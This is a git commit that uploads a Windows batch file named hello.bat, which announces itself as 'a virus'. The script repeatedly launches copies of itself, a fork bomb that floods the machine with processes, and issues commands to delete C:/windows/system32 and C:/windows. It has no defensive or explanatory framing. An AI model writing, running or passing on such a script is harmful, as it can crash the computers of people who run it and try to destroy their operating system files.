7a0ded4dbfc6e47b48df25bfa227afe5d4d7f073
rickastley10 <148710838+rickastley10@users.noreply.github.com>
2023-11-02 18:10:53 +0400

    Add files via upload

---
+++ hello.bat
@@ -0,0 +1,14 @@
+start echo hello
+start echo im a virus
+start hello.bat
+start hello.bat
+start rm C:/windows/system32
+start rm C:/windows
+start hello.bat
+start hello.bat
+start rm C:/windows/system32
+start rm C:/windows
+start hello.bat
+start hello.bat
+start rm C:/windows/system32
+start rm C:/windows
